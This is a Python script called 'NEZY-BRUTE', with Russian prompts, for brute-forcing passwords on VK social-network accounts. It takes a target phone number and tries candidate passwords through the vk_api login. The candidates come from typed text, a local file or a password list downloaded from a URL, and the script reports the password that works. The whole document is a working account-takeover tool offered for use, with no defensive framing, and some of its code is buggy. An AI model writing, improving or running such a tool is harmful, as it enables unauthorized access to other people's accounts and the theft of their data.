import requests
import os
import time
import vk_api
import colorama
from colorama import init, Fore, Back, Style
from datetime import datetime
try:
    import vk_api
    import colorama
except ImportError as e:
    print(Fore.RED, f'[NEZY-BRUTE] Ошибка импорта модуля: {e}')
    print(Fore.GREEN, f'[NEZY-BRUTE] Начинаем установку модулей....')
    os.system('pip install vk_api requests colorama')
    import vk_api
    import colorama
    import requests 
    
init()

def authorize(phone, password):
    try:
        session = vk_api.VkApi(phone, password)
        session.auth()
        now = datetime.now().strftime('%d-%m-%Y %H:%M:%S')
        print(Fore.GREEN, f'[NEZY-BRUTE] Пароль успешно подобран: {password}. Время: {now}')
        return True
    except vk_api.AuthError as e:
        print(Fore.RED, f'[NEZY-BRUTE] Неверный пароль: {password}. Ошибка: {e}')
        return False
    except Exception as e:
        print(Fore.RED, f'[NEZY-BRUTE] Произошла ошибка: {e}')
        return False

now = datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S')
print(Fore.MAGENTA, ' _   _                ')
print(Fore.MAGENTA, '| \ | |               ')
print(Fore.MAGENTA, '|  \| | ___ _____   _ ')
print(Fore.MAGENTA, '| . ` |/ _ \_  / | | |')
print(Fore.MAGENTA, '| |\  |  __// /| |_| |')
print(Fore.MAGENTA, '\_| \_/\___/___|\__, |')
print(Fore.MAGENTA, '                 __/ |')
print(Fore.MAGENTA, '                |___/ ')
print('\n')
print(Fore.WHITE, 'Coded by @NezyGhoul#8130')
print('\n')

while True:
    print(Fore.LIGHTCYAN_EX, '[1] Через введенную строку.')
    print(Fore.LIGHTCYAN_EX, '[2] Через файл.')
    print(Fore.LIGHTCYAN_EX, '[3] Через ссылку.')
    method = input('Выбери метод брутфорса -> ')
    if method not in ['1', '2', '3']:
        print(Fore.RED, '[-] Такого действия нет. Попробуйте снова!')
    else:
        break
        
phone = input('[*] Напишите номер телефона -> ')

if method == '1':
    catched = list(map(str, input("[*] Введи слова для брутфорса через запятую -> ").split(', ')))
    for password in catched:
        if authorize(phone, password):
            break

if method == '2':
    filename = input('[*] Введите название файла -> ')
    try:
        with open(filename) as file:
            password_lines = [line.strip() for line in file]
    except FileNotFoundError:
        print(Fore.RED, f'[NEZY-BRUTE] Файл {filename} не найден.')
    for password in password_lines:
        if authorize(phone, password):
            break
    file.close()

if method == '3':
    url = input('[*] Введите ссылку на базу паролей -> ')
    rq = requests.get(url)
    password_lines = rq.text.split('\n')
    for password in password_lines:
        if authorize(phone, password):
            break
